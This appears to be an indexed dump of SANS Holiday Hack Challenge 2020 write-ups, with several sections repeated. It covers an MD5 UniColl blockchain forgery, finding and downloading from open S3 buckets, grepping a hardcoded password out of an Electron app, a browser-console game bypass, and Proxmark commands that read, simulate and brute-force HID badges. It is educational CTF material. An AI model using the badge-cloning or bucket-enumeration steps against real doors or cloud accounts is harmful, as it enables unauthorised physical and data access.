Data Length: 0000006c Data: b'ea465340303a6079d3df2762be68467c27f...' Data item: 2 Data Type: 05 (PDF) Data Length: 00009f57 Data: b'255044462d312e330a2525c1cec7c5210a0...' Date: 03/24 Time: 13:21:41 PreviousHash: 4a91947439046c2dbaa96db38e924665 Data Hash to Sign: 347979fece8d403e06f89f8633b5231a Signature: b'MJIxJy2iFXJRCN1EwDsqO9NzE2Dq1qlvZuFFlljm...' The block data contains the highest possible nice score (lines 6-7) and a glowing PDF report about Jack Frost (lines 13-15). Any tampering with the blockchain should cause a verification failure, which it doesn't. It seems like the MD5 hash of the unsigned block data, the signature, and the md5 hash of the signed block data didn't change at all. More on that later. The objective also mentions that only 4 bytes were modified. The sign field, which indicates if the score is naughty or nice, only takes up 1 byte. Replacing a whole PDF file would requires far more than the remaining 3 bytes. Manipulating the PDF In reality, the PDF document wasn't replaced at all. It already contained both the scathing report and its glowing alternative prior to being added to the blockchain. You can toggle between both versions by changing the object the PDF catalog points to. The default value of 2 will display the nice content. Changing the value to 3 will render the PDF starting from a different object tree and show the original report which is far less positive. Modified PDF Original PDF Enter... hash collissions! While it's now clear what was changed, we still need to find 2 of the 4 modified bytes and explain how changing the sign from 0 to 1 and the PDF catalog from 3 to 2 didn't change the MD5 hash of the data, triggering a verification failure of the blockchain as a result. That's where hash collisions, and more specifically UniColl , come into the picture. Using a UniColl hash collision, 2 sets of data can be created which share the same MD5 yet differ by 2 bytes. While the location of these 2 bytes is predefined (i.e. the 10th char of the prefix and the 10th char of the 2nd block) adding redundant data to the prefix ensures the data we want to modify neatly aligns with the location of the first byte. That's why the PDF catalog entry is set to <</Type/Catalog/_Go_Away/Santa/Pages 2 0 R instead of <</Type/Catalog/Pages 2 0 R . The _Go_Away/Santa/ part was added to align the catalog reference with the first collision byte. Jack got lucky with the sign value as the block's data structure puts that byte in the expected location out of the box. A second important characteristic of a UniColl hash collision is that the way both bytes change is predefined as well. The 10th byte of the prefix will either be +1 or -1, while the 10th byte of the second block will change by the same amount but in the other direction. In other words, increasing sign from 0 to 1 requires the 10th byte of the second block to decrease by 1. Recreating the original block We can now modify the signed data block we extracted from the blockchain and revert it to the state it was in when Shinny Upatree was tricked into adding Jack's tampered PDF to the blockchain. The below images show the locations and values of the 2 collision bytes for both the sign field and the PDF catalog entry. The tampered version of the signed block data (i.e., 129459.dat ) is shown at the top while the pre-tamper original is shown on the bottom (i.e., 129459_orig.dat ). First UniColl collision (sign) Second UniColl collision (PDF catalog) What about the signature? Because of the UniColl hash collisions the MD5 hash of the unsigned block data remains the same regardless of the the 4-byte change. This causes the signature to remain valid as it's created using the MD5 hash of the unsigned block data. As the signature is appended at the end of the unsigned block data, the MD5 of the signed block data (which is stored as part of the next block in the chain) remains the same as well. Finally, calculate the SHA256 of the original signed block data. Answer fff054f33c2134e0230efb29dad515064ac97aa8c68d33c58c01213a0d408afb","title":"Naughty/Nice List Pt.2"},{"location":"objectives/o11b/#naughtynice-list-with-blockchain-investigation-part-2","text":"Difficulty : Direct link : blockchain.dat Terminal hint : Snowball Fight","title":"Naughty/Nice List with Blockchain Investigation Part 2"},{"location":"objectives/o11b/#objective","text":"Request The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?","title":"Objective"},{"location":"objectives/o11b/#hints","text":"Imposter Block Event Shinny Upatree swears that he doesn't remember writing the contents of the document found in that block. Maybe looking closely at the documents, you might find something interesting. Unique Hash Collision If Jack was somehow able to change the contents of the block AND the document without changing the hash... that would require a very UNIque hash COLLision . Blockchain ... Chaining A blockchain works by \"chaining\" blocks together - each new block includes a hash of the previous block. That previous hash value is included in the data that is hashed - and that hash value will be in the next block. So there's no way that Jack could change an existing block without it messing up the chain... Minimal Changes Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It's like some sort of evil game to him. Block Investigation The idea that Jack could somehow change the data in a block without invalidating the whole chain just collides with the concept of hashes and blockchains. While there's no way it could happen, maybe if you look at the block that seems like it got changed, it might help. Blockchain Talk Qwerty Petabyte is giving a talk about blockchain tomfoolery!","title":"Hints"},{"location":"objectives/o11b/#solution","text":"Understanding the Naughty/Nice Blockchain format Professor Qwerty Petabyte explains the architecture and technical background of the Naughty/Nice Blockchain in great detail but two key points to remember are (1) that each block in the blockchain contains the MD5 hash of the previous signed block data (i.e., block data + signature) and (2) that the signature is created based on the MD5 of the block data.","title":"Solution"},{"location":"objectives/o2/","text":"Investigate S3 Bucket \u2693\ufe0e Difficulty : Direct link : awsbucket terminal Terminal hint : Kringle Kiosk Objective \u2693\ufe0e Request When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge. Shinny Upatree Say, we've been having an issue with an Amazon S3 bucket. Do you think you could help find Santa's package file? Jeepers, it seems there's always a leaky bucket in the news. You'd think we could find our own files! Digininja has a great guide, if you're new to S3 searching. He even released a tool for the task - what a guy! The package wrapper Santa used is reversible, but it may take you some trying. Good luck, and thanks for pitching in! Hints \u2693\ufe0e Find Santa's Package Find Santa's package file from the cloud storage provider. Check Josh Wright's talk for more tips! Santa's Wrapper3000 Santa's Wrapper3000 is pretty buggy. It uses several compression tools, binary to ASCII conversion, and other tools to wrap packages. Finding S3 Buckets Robin Wood wrote up a guide about finding these open S3 buckets . Leaky AWS S3 Buckets It seems like there's a new story every week about data exposed through unprotected Amazon S3 buckets . Bucket_finder.rb He even wrote a tool to search for unprotected buckets ! Solution \u2693\ufe0e Updated greeting During the event the message displayed when opening the terminal was updated with some additional hints. Hints: Use the file command to identify a file type. You can also examine tool help using the man command. Search all man pages for a string such as a file extension using the apropos command. To see this help again, run cat /etc/motd. First we need to find the S3 bucket that contains Santa's package file. Navigate to the bucket_finder folder which contains a bucket_finder.rb script and a sample wordlist with some sample bucket names. Running bucket_finder.rb wordlist will find some buckets, but none will be publicly accessible. The welcome message displayed when you connect to the terminal highlights the Wrapper3000 string, so add a couple of variations of the word to the wordlist file and execute the command bucket_finder.rb wordlist --download . This not only checks for publicly accessible S3 buckets matching the strings specified in the wordlist file, but also downloads the data. Be nice! During the event the bucket_finder.rb script was updated to limit the number of entries in the wordlist to 50. HO HO HO The people at AWS are on the nice list this year! You shouldn't use such a long wordlist. Use the hints in the description for this challenge to help choose a small wordlist to find the missing bucket! Run 'cat /etc/motd' to see it again. SANTA Now that the package file has been downloaded to /home/elf/bucket_finder/wrapper3000/package , we can start the process of unpacking it. We first need to determine the file type though. Run file package which will tell you the contents of the file is ASCII text, with very long lines . cat package will show you the contents. /home/elf/bucket_finder/wrapper3000/package UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAA BCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5 QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmik tINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0I sCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6X n6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAA gDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAA BQSwUGAAAAAAEAAQBiAAAA9QEAAAAA Looks like we're dealing with BASE64 -encoded data which gives us our starting point. Since we can't be sure what the output of the decoded data will be, we will redirect the output to a file instead of the console using cat package | base64 -d > package2 . From this point forward we repeat the process of identifying the file format and unpacking. # Input file File type Unpack command 1 package BASE64 cat package | base64 -d > package2 2 package2 ZIP archive unzip package2 3 package.txt.Z.xz.xxd.tar.bz2 bzip2 archive bunzip2 package.txt.Z.xz.xxd.tar.bz2 4 package.txt.Z.xz.xxd.tar tar archive tar xf package.txt.Z.xz.xxd.tar 5 package.txt.Z.xz.xxd Hex dump xxd -r package.txt.Z.xz.xxd > package.txt.Z.xz 6 package.txt.Z.xz xz archive xz -d package.txt.Z.xz 7 package.txt.Z compress'd data uncompress package.txt.Z Finally, after 7 steps, cat package.txt gives us the answer. Answer North Pole: The Frostiest Place on Earth","title":"Investigate S3 Bucket"},{"location":"objectives/o2/#investigate-s3-bucket","text":"Difficulty : Direct link : awsbucket terminal Terminal hint : Kringle Kiosk","title":"Investigate S3 Bucket"},{"location":"objectives/o2/#objective","text":"Request When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge. Shinny Upatree Say, we've been having an issue with an Amazon S3 bucket. Do you think you could help find Santa's package file? Jeepers, it seems there's always a leaky bucket in the news. You'd think we could find our own files! Digininja has a great guide, if you're new to S3 searching. He even released a tool for the task - what a guy! The package wrapper Santa used is reversible, but it may take you some trying. Good luck, and thanks for pitching in!","title":"Objective"},{"location":"objectives/o2/#hints","text":"Find Santa's Package Find Santa's package file from the cloud storage provider. Check Josh Wright's talk for more tips! Santa's Wrapper3000 Santa's Wrapper3000 is pretty buggy. It uses several compression tools, binary to ASCII conversion, and other tools to wrap packages. Finding S3 Buckets Robin Wood wrote up a guide about finding these open S3 buckets . Leaky AWS S3 Buckets It seems like there's a new story every week about data exposed through unprotected Amazon S3 buckets . Bucket_finder.rb He even wrote a tool to search for unprotected buckets !","title":"Hints"},{"location":"objectives/o2/#solution","text":"Updated greeting During the event the message displayed when opening the terminal was updated with some additional hints. Hints: Use the file command to identify a file type. You can also examine tool help using the man command. Search all man pages for a string such as a file extension using the apropos command. To see this help again, run cat /etc/motd. First we need to find the S3 bucket that contains Santa's package file. Navigate to the bucket_finder folder which contains a bucket_finder.rb script and a sample wordlist with some sample bucket names. Running bucket_finder.rb wordlist will find some buckets, but none will be publicly accessible. The welcome message displayed when you connect to the terminal highlights the Wrapper3000 string, so add a couple of variations of the word to the wordlist file and execute the command bucket_finder.rb wordlist --download . This not only checks for publicly accessible S3 buckets matching the strings specified in the wordlist file, but also downloads the data. Be nice! During the event the bucket_finder.rb script was updated to limit the number of entries in the wordlist to 50. HO HO HO The people at AWS are on the nice list this year! You shouldn't use such a long wordlist. Use the hints in the description for this challenge to help choose a small wordlist to find the missing bucket! Run 'cat /etc/motd' to see it again. SANTA Now that the package file has been downloaded to /home/elf/bucket_finder/wrapper3000/package , we can start the process of unpacking it. We first need to determine the file type though. Run file package which will tell you the contents of the file is ASCII text, with very long lines . cat package will show you the contents. /home/elf/bucket_finder/wrapper3000/package UEsDBAoAAAAAAIAwhFEbRT8anwEAAJ8BAAAcABwAcGFja2FnZS50eHQuWi54ei54eGQudGFyLmJ6MlVUCQADoBfKX6AXyl91eAsAAQT2AQAABBQAAA BCWmg5MUFZJlNZ2ktivwABHv+Q3hASgGSn//AvBxDwf/xe0gQAAAgwAVmkYRTKe1PVM9U0ekMg2poAAAGgPUPUGqehhCMSgaBoAD1NNAAAAyEmJpR5 QGg0bSPU/VA0eo9IaHqBkxw2YZK2NUASOegDIzwMXMHBCFACgIEvQ2Jrg8V50tDjh61Pt3Q8CmgpFFunc1Ipui+SqsYB04M/gWKKc0Vs2DXkzeJmik tINqjo3JjKAA4dLgLtPN15oADLe80tnfLGXhIWaJMiEeSX992uxodRJ6EAzIFzqSbWtnNqCTEDML9AK7HHSzyyBYKwCFBVJh17T636a6YgyjX0eE0I sCbjcBkRPgkKz6q0okb1sWicMaky2Mgsqw2nUm5ayPHUeIktnBIvkiUWxYEiRs5nFOM8MTk8SitV7lcxOKst2QedSxZ851ceDQexsLsJ3C89Z/gQ6X n6KBKqFsKyTkaqO+1FgmImtHKoJkMctd2B9JkcwvMr+hWIEcIQjAZGhSKYNPxHJFqJ3t32Vjgn/OGdQJiIHv4u5IpwoSG0lsV+UEsBAh4DCgAAAAAA gDCEURtFPxqfAQAAnwEAABwAGAAAAAAAAAAAAKSBAAAAAHBhY2thZ2UudHh0LloueHoueHhkLnRhci5iejJVVAUAA6AXyl91eAsAAQT2AQAABBQAAA BQSwUGAAAAAAEAAQBiAAAA9QEAAAAA Looks like we're dealing with BASE64 -encoded data which gives us our starting point. Since we can't be sure what the output of the decoded data will be, we will redirect the output to a file instead of the console using cat package | base64 -d > package2 . From this point forward we repeat the process of identifying the file format and unpacking. # Input file File type Unpack command 1 package BASE64 cat package | base64 -d > package2 2 package2 ZIP archive unzip package2 3 package.txt.Z.xz.xxd.tar.bz2 bzip2 archive bunzip2 package.txt.Z.xz.xxd.tar.bz2 4 package.txt.Z.xz.xxd.tar tar archive tar xf package.txt.Z.xz.xxd.tar 5 package.txt.Z.xz.xxd Hex dump xxd -r package.txt.Z.xz.xxd > package.txt.Z.xz 6 package.txt.Z.xz xz archive xz -d package.txt.Z.xz 7 package.txt.Z compress'd data uncompress package.txt.Z Finally, after 7 steps, cat package.txt gives us the answer. Answer North Pole: The Frostiest Place on Earth","title":"Solution"},{"location":"objectives/o3/","text":"Point-of-Sale Password Recovery \u2693\ufe0e Difficulty : Direct link : santashop website Terminal hint : Linux Primer Objective \u2693\ufe0e Request Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password? Sugarplum Mary Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application. Hints \u2693\ufe0e Electron ASAR Extraction There are tools and guides explaining how to extract ASAR from Electron apps. Electron Applications *It's possible to extract the source code from an Electron app. Solution \u2693\ufe0e Download the santa-shop.exe binary using the link provided on the santa-shop website. The file command tells us it's a Windows executable (thanks Captain Obvious) and a Nullsoft Installer self-extracting archive , which means we can extract the contents using pretty much any capable archive manager. 7-Zip on Windows, Engrampa on Kali Linux, and The Unarchiver on macOS all work. Inside the binary you'll find a 7-zip archive named app-64.7z . Extract that as well. The app.assar archive file is what we're looking for. While the hints provided by Sugarplum Mary point to a tool and a guide on how to extract these types of archives, all we really need is grep -a pass app.asar to search for lines containing the string pass . Asar file format Asar is a simple extensive archive format, it works like tar that concatenates all files together without compression, while having random access support. Concatenating plaintext and binary files together doesn't modify the data. In other words, because no compression is being applied, any plaintext information that goes into the Asar archive remains plaintext and will be searchable. The -a parameter forces grep to treat the whole file as ASCII text and print any matching lines to the command line. Answer santapass","title":"PoS Password Recovery"},{"location":"objectives/o3/#point-of-sale-password-recovery","text":"Difficulty : Direct link : santashop website Terminal hint : Linux Primer","title":"Point-of-Sale Password Recovery"},{"location":"objectives/o3/#objective","text":"Request Help Sugarplum Mary in the Courtyard find the supervisor password for the point-of-sale terminal. What's the password? Sugarplum Mary Hey, wouldja' mind helping me get into my point-of-sale terminal? It's down, and we kinda' need it running. Problem is: it is asking for a password. I never set one! Can you help me figure out what it is so I can get set up? Shinny says this might be an Electron application.","title":"Objective"},{"location":"objectives/o3/#hints","text":"Electron ASAR Extraction There are tools and guides explaining how to extract ASAR from Electron apps. Electron Applications *It's possible to extract the source code from an Electron app.","title":"Hints"},{"location":"objectives/o3/#solution","text":"Download the santa-shop.exe binary using the link provided on the santa-shop website. The file command tells us it's a Windows executable (thanks Captain Obvious) and a Nullsoft Installer self-extracting archive , which means we can extract the contents using pretty much any capable archive manager. 7-Zip on Windows, Engrampa on Kali Linux, and The Unarchiver on macOS all work. Inside the binary you'll find a 7-zip archive named app-64.7z . Extract that as well. The app.assar archive file is what we're looking for. While the hints provided by Sugarplum Mary point to a tool and a guide on how to extract these types of archives, all we really need is grep -a pass app.asar to search for lines containing the string pass . Asar file format Asar is a simple extensive archive format, it works like tar that concatenates all files together without compression, while having random access support. Concatenating plaintext and binary files together doesn't modify the data. In other words, because no compression is being applied, any plaintext information that goes into the Asar archive remains plaintext and will be searchable. The -a parameter forces grep to treat the whole file as ASCII text and print any matching lines to the command line. Answer santapass","title":"Solution"},{"location":"objectives/o4/","text":"Operate the Santavator \u2693\ufe0e Difficulty : Direct link : elevator website Terminal hint : Unscape Tmux and The Elf C0de Objective \u2693\ufe0e Request Talk to Pepper Minstix in the entryway to get some hints about the Santavator. Sparkle Redberry Hey hey, Sparkle Redberry here! The Santavator is on the fritz. Something with the wiring is grinchy, but maybe you can rig something up? Here's the key! Good luck! With that key, you can look under the panel and see the Super Santavator Sparkle Stream (S4). To get to different floors, you'll need to power the various colored receivers. Hints \u2693\ufe0e Santavator Operations It's really more art than science. The goal is to put the right colored light into the receivers on the left and top of the panel. Santavator Bypass There may be a way to bypass the Santavator S4 game with the browser console... Solution \u2693\ufe0e Sparkle Redberry gives you a key to open up the Santavator panel which will reveal the Super Santavator Sparkle Stream (S4) and the yellow, red, and green receivers. There's 2 main ways to solve this challenge,. Either find items and arrange them to color and direct the stream towards the receivers. Alternatively, you can use the app.js JavaScript code to bypass the Santavator. This write-up focuses on the most basic solution to complete the challenge by using 2 items to activate a single floor. Start by talking to Sparkle Redberry who will hand you a key to open the Santavator panel. You'll find a hex nut in front of the Santavator and a green light bulb in the top left corner of the Courtyard. Open the Santavator panel by clicking on the key and use the hex nut and green light bulb as shown in the image below. Activating the green receiver will get you to the second floor where the talks are held. You can now find additional items like the red light bulb in the top right corner of the Talks Lobby. Since the hex nut already splits the stream towards the red and green receivers, adding the red light bulb in front of the red receiver will get you access to the Workshop and Roof. Below is an overview of where the different items are located. Item Floor Room Candycane 1 In front of the castle door on the Front Lawn Hex nut 1 In front of the Santavator in the Entryway Hex nut 1 Behind the table in the Dining Room (hidden from view) Santavator key 1 Received from Sparkle Redberry Green light bulb 1 Top left corner of the Courtyard Red light bulb 2 Top right corner of the Talks Lobby Yellow light bulb R Top left corner of the Netwars Room Large marble 1.5 Workshop Room Small marble R Bottom right corner of the Netwars Room (hidden from view) Proxmark 1.5 Wrapping Room Rubber ball 1.5 Wrapping Room Elevator 1.5 button 2 Speaker UNPreparedness Room Portals 2 Dropped by Release the Snacken Answer Use the hex nut found in front of the Santavator and the green light bulb found in the Courtyard to power the green receiver. Bypassing the Santavator Another option to get to the other floors, except for Santa's office which also requires a fingerprint sensor bypass , is by analysing app.js . Once the proper particle amount for each stream color has been collected (line 3), the renderTraps() function will change the value of the associated color LED in the powered array to true (line 7) and turn on the LED by adding the on CSS class to the LED HTML element (line 6). Vice versa, when the stream levels drop too low the value in the powered array changes back to false (line 7) and the LED is turned off by removing the on CSS class (line 6). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const renderTraps = () => { TRAPS . forEach (( points , index ) => { const fillLevel = pl . Math . clamp ( PARTICLE_COUNTS [ index ]. length / trapTargetCounts [ index ], 0 , 1 ); const steppa = Math . floor ( fillLevel / ( 1 / wireSteps [ index ])); wireElements [ index ]. style . backgroundPosition = `0 ${ - wireElements [ index ]. clientHeight * steppa } px` ; ledElements [ index ]. classList [ fillLevel === 1 ? 'add' : 'remove' ]( 'on' ); powered [ index ] = fillLevel === 1 ; }); btn1 . classList [ powered [ 2 ] ? 'add' : 'remove' ]( 'powered' ); btn3 . classList [ powered [ 2 ] ? 'add' : 'remove' ]( 'powered' ); btn2 . classList [ powered [ 2 ] && powered [ 0 ] && hasToken ( 'workshop-button' ) ? 'add' : 'remove' ]( 'powered' ); btnr . classList [ powered [ 2 ] && powered [ 0 ] ? 'add' : 'remove' ]( 'powered' ); btn4 . classList [ powered [ 2 ] && powered [ 1 ] && powered [ 0 ] ? 'add' : 'remove' ]( 'powered' ); }; Based on which combination of LEDs are turned on at any given time, the associated buttons will be powered on as well. This is handled by the remainder of the renderTraps() function which uses the state of the powered array to add a powered CSS class to the button elements (lines 10-16). Because the renderTraps() function is continuously called as the scene is being rendered by the render() function, any manual HTML edits to these buttons will be reverted by the renderTraps() function as soon as the proper conditions aren't met anymore. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function render ( newtime ) { if ( stop ) { return ; } requestAnimationFrame ( render ); now = newtime ; elapsed = now - then ; if ( elapsed > fpsInterval ) { then = now - ( elapsed % fpsInterval ); ... SNIP ... renderTraps (); } } There's a workaround though. The first thing the render() function does is check the value of a stop variable (lines 2-4). If stop is true , we exit from the function and renderTraps() isn't called at all (line 13). This freezes the stream and prevents any manual HTML changes from being reverted. The way app.js handles showing button 1.5 is by checking if the challenge URL contains a workshop-button value as part of the tokens GET request parameter. If that's the case a found CSS class will be added to the image identified by the f15btn CSS class (line 4), which adds the button to the panel. 1 2 3 4 5 const btn15img = document . querySelector ( 'img.f15btn' ); if ( hasToken ( 'workshop-button' )) { btn15img . classList . add ( 'found' ); } We can now bypass the Super Santavator Sparkle Stream by taking the following actions: Open the web browser's developer tools Open the panel to expose the circuitry Enter stop = true in the JavaScript console to freeze the stream Close the panel again Add a found CSS class to the f15btn image so it appears Add a powered CSS class to each of the button elements Press the button for the desired floor","title":"Operate the Santavator"},{"location":"objectives/o4/#operate-the-santavator","text":"Difficulty : Direct link : elevator website Terminal hint : Unscape Tmux and The Elf C0de","title":"Operate the Santavator"},{"location":"objectives/o4/#objective","text":"Request Talk to Pepper Minstix in the entryway to get some hints about the Santavator. Sparkle Redberry Hey hey, Sparkle Redberry here! The Santavator is on the fritz. Something with the wiring is grinchy, but maybe you can rig something up? Here's the key! Good luck! With that key, you can look under the panel and see the Super Santavator Sparkle Stream (S4). To get to different floors, you'll need to power the various colored receivers.","title":"Objective"},{"location":"objectives/o4/#hints","text":"Santavator Operations It's really more art than science. The goal is to put the right colored light into the receivers on the left and top of the panel. Santavator Bypass There may be a way to bypass the Santavator S4 game with the browser console...","title":"Hints"},{"location":"objectives/o4/#solution","text":"Sparkle Redberry gives you a key to open up the Santavator panel which will reveal the Super Santavator Sparkle Stream (S4) and the yellow, red, and green receivers. There's 2 main ways to solve this challenge,. Either find items and arrange them to color and direct the stream towards the receivers. Alternatively, you can use the app.js JavaScript code to bypass the Santavator. This write-up focuses on the most basic solution to complete the challenge by using 2 items to activate a single floor. Start by talking to Sparkle Redberry who will hand you a key to open the Santavator panel. You'll find a hex nut in front of the Santavator and a green light bulb in the top left corner of the Courtyard. Open the Santavator panel by clicking on the key and use the hex nut and green light bulb as shown in the image below. Activating the green receiver will get you to the second floor where the talks are held. You can now find additional items like the red light bulb in the top right corner of the Talks Lobby. Since the hex nut already splits the stream towards the red and green receivers, adding the red light bulb in front of the red receiver will get you access to the Workshop and Roof. Below is an overview of where the different items are located. Item Floor Room Candycane 1 In front of the castle door on the Front Lawn Hex nut 1 In front of the Santavator in the Entryway Hex nut 1 Behind the table in the Dining Room (hidden from view) Santavator key 1 Received from Sparkle Redberry Green light bulb 1 Top left corner of the Courtyard Red light bulb 2 Top right corner of the Talks Lobby Yellow light bulb R Top left corner of the Netwars Room Large marble 1.5 Workshop Room Small marble R Bottom right corner of the Netwars Room (hidden from view) Proxmark 1.5 Wrapping Room Rubber ball 1.5 Wrapping Room Elevator 1.5 button 2 Speaker UNPreparedness Room Portals 2 Dropped by Release the Snacken Answer Use the hex nut found in front of the Santavator and the green light bulb found in the Courtyard to power the green receiver. Bypassing the Santavator Another option to get to the other floors, except for Santa's office which also requires a fingerprint sensor bypass , is by analysing app.js . Once the proper particle amount for each stream color has been collected (line 3), the renderTraps() function will change the value of the associated color LED in the powered array to true (line 7) and turn on the LED by adding the on CSS class to the LED HTML element (line 6). Vice versa, when the stream levels drop too low the value in the powered array changes back to false (line 7) and the LED is turned off by removing the on CSS class (line 6). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const renderTraps = () => { TRAPS . forEach (( points , index ) => { const fillLevel = pl . Math . clamp ( PARTICLE_COUNTS [ index ]. length / trapTargetCounts [ index ], 0 , 1 ); const steppa = Math . floor ( fillLevel / ( 1 / wireSteps [ index ])); wireElements [ index ]. style . backgroundPosition = `0 ${ - wireElements [ index ]. clientHeight * steppa } px` ; ledElements [ index ]. classList [ fillLevel === 1 ? 'add' : 'remove' ]( 'on' ); powered [ index ] = fillLevel === 1 ; }); btn1 . classList [ powered [ 2 ] ? 'add' : 'remove' ]( 'powered' ); btn3 . classList [ powered [ 2 ] ? 'add' : 'remove' ]( 'powered' ); btn2 . classList [ powered [ 2 ] && powered [ 0 ] && hasToken ( 'workshop-button' ) ? 'add' : 'remove' ]( 'powered' ); btnr . classList [ powered [ 2 ] && powered [ 0 ] ? 'add' : 'remove' ]( 'powered' ); btn4 . classList [ powered [ 2 ] && powered [ 1 ] && powered [ 0 ] ? 'add' : 'remove' ]( 'powered' ); }; Based on which combination of LEDs are turned on at any given time, the associated buttons will be powered on as well. This is handled by the remainder of the renderTraps() function which uses the state of the powered array to add a powered CSS class to the button elements (lines 10-16). Because the renderTraps() function is continuously called as the scene is being rendered by the render() function, any manual HTML edits to these buttons will be reverted by the renderTraps() function as soon as the proper conditions aren't met anymore. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 function render ( newtime ) { if ( stop ) { return ; } requestAnimationFrame ( render ); now = newtime ; elapsed = now - then ; if ( elapsed > fpsInterval ) { then = now - ( elapsed % fpsInterval ); ... SNIP ... renderTraps (); } } There's a workaround though. The first thing the render() function does is check the value of a stop variable (lines 2-4). If stop is true , we exit from the function and renderTraps() isn't called at all (line 13). This freezes the stream and prevents any manual HTML changes from being reverted. The way app.js handles showing button 1.5 is by checking if the challenge URL contains a workshop-button value as part of the tokens GET request parameter. If that's the case a found CSS class will be added to the image identified by the f15btn CSS class (line 4), which adds the button to the panel. 1 2 3 4 5 const btn15img = document . querySelector ( 'img.f15btn' ); if ( hasToken ( 'workshop-button' )) { btn15img . classList . add ( 'found' ); } We can now bypass the Super Santavator Sparkle Stream by taking the following actions: Open the web browser's developer tools Open the panel to expose the circuitry Enter stop = true in the JavaScript console to freeze the stream Close the panel again Add a found CSS class to the f15btn image so it appears Add a powered CSS class to each of the button elements Press the button for the desired floor","title":"Solution"},{"location":"objectives/o5/","text":"Open HID Lock \u2693\ufe0e Difficulty : Direct link : proxmark terminal Terminal hint : Speaker UNPrep and 33.6kbps Objective \u2693\ufe0e Request Open the HID lock in the Workshop. Talk to Bushy Evergreen near the talk tracks for hints on this challenge. You may also visit Fitzy Shortstack in the kitchen for tips. Bushy Evergreen Some people scan other people's badges and try those codes at locked doors. Other people scan one or two and just try to vary room numbers. Do whatever works best for you! Fitzy Shortstack You know, Santa really seems to trust Shinny Upatree... Hints \u2693\ufe0e Reading Badges with Proxmark You can use a Proxmark to capture the facility code and ID value of HID ProxCard badge by running lf hid read when you are close enough to someone with a badge. Impersonating Badges with Proxmark You can also use a Proxmark to impersonate a badge to unlock a door, if the badge you impersonate has access. `lf hid sim -r 2006...... What's a Proxmark? The Proxmark is a multi-function RFID device, capable of capturing and replaying RFID events. Short List of Essential Proxmark Commands There's a short list of essential Proxmark commands also available. Proxmark Talk Larry Pesce knows a thing or two about HID attacks . He's the author of a course on wireless hacking! Solution \u2693\ufe0e To solve this challenge we need to find a Proxmark device, roam around Santa's castle to scan NPC badges, and use the collected information to open the HID lock in the workshop. The Proxmark device can be found next to the table in the Wrapping Room and after picking it up you'll be able to access the Proxmark CLI via the item list on your conference badge. As per Bushy Evergreen's hint we can either go around scanning all the NPC badges or we can scan just a few and then fill in the blanks. As Larry Pesce mentions in his HID attacks HID cards are often sold with sequential ID numbers. So all we really need is just enough information to determine that sequence. To scan a badge, stand next to an NPC, open the Proxmark CLI and type lf search or lf hid read . If the NPC has a badge these commands will return the HID card information such as the facility code (FC), and the card ID. Walking around the castle we can compile the following list of badge IDs. NPC name Wiegand Facility code ID Sparkle Redberry 2006e22f0d 113 6022 Shinny Upatree 2006e22f13 113 6025 Holly Evergreen 2006e22f10 113 6024 Noel Boetie (old) 2006e22f08 113 6020 Noel Boetie (new) 2006e22ee1 113 6000 Bow Ninecandle 2006e22f0e 113 6023 Noel Boetie's new badge It appears that Noel was issued a replacement badge during the event. When first scanning Noel Boetie's badge his ID number was 6020. As noted previously, there is no need to scan all of the badges in the above table. If you happen to scan Noel Boetie's old badge and Shinny Upatree's badge it'd be clear that the most likely badge ID sequence is 6020 to 6025. Now that we have some badge ID values we can head back to the Workshop Room. Stand next to the HID lock, open the Proxmark CLI, and simulate a badge using its Wiegand value. For example, to simulate Sparkle Redberry's badge use lf hid sim -r 2006e22f0d . Alternatively, if you're extrapolating badge IDs based on collected information, you can use lf hid sim -w H10301 --fc 113 --cn 6024 to simulate Holly Evergreen's badge. Simply iterate over all badge IDs until the door unlocks. If you've already solved the 33.6kbps terminal hint then Fitzy Shortstack will have told you that Santa really seems to trust Shinny Upatree which confirms our solution. Shinny Upatree's badge is indeed the one that opens the door. Answer Use lf hid sim -r 2006e22f13 or lf hid sim -w H10301 --fc 113 --cn 6025 to unlock the door using Shinny Upatree's badge information. Being Santa Claus \u2693\ufe0e Walk to the end of the dark hallway. The two lights at the end are peephole cutouts for the eyes in the portrait hanging behind Santa in the Entryway. If you move forward towards the light you will end up in Santa's body. This is a direct reference to the movie Being John Malkovich and is explained in more detail in the Easter Egg section. It's also where the idea for this image came from. 